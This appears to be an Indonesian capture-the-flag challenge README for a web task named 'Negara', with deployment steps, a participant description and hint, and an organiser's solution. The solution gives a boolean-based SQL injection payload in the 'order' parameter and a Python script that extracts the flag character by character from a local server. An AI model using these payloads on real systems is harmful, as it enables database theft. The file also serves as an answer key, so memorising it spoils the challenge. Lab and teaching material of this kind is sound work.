# Negara


# Web_Challenge_Difficulties

Author: Ismail Hakim - twang#7040

Descriptions: Web 

# Untuk Panitia

Flag: FindITCTF{flag}

Deployment steps:

```python
cd web_negara_medium
./docker.sh
```

Solving steps:

1. Melihat fungsionalitas dari web
2. Adanya SQL injection pada order: dengan melakukan cek pada nilai yang selalu benar
`search=&order=CASE+WHEN+(1=1)+THEN+name+ELSE+numeric+END` 

dan nilai yang selalu salah `search=&order=CASE+WHEN+(1=2)+THEN+name+ELSE+numeric+END` . Terdapat perbedaan urutan dari tabel.
3. Membuat script untuk mengambil informasi flag pada tabel flag.

solve.py

```python
#!/usr/bin/env python3

import requests
import string

url = 'http://localhost:1337'
chars = string.ascii_lowercase + string.ascii_uppercase + '0123456789' + '{}_'
inject = "CASE WHEN (SELECT SUBSTR(flag,{},1) FROM flag)='{}' THEN name ELSE numeric END"

flag = ''
index = 1
char = 'f'

while True:
    for char in chars:
        req = requests.post(url, data= { 'search': '', 'order': inject.format(index, char) })
        res = req.text.split('\n')
        # print ("trying: ", char)
        if 'ALA' in res[123]:
            flag += char
            index+=1
            print(flag)
            break
    if flag[-1] == '}':
       break
```

# Untuk Peserta

Nama Problem: Negara

Deskripsi singkat: Referensi kode negara untuk umum. Cek aja di website kami.

Hint (jika perlu): Flag ada di dalam tabel flag
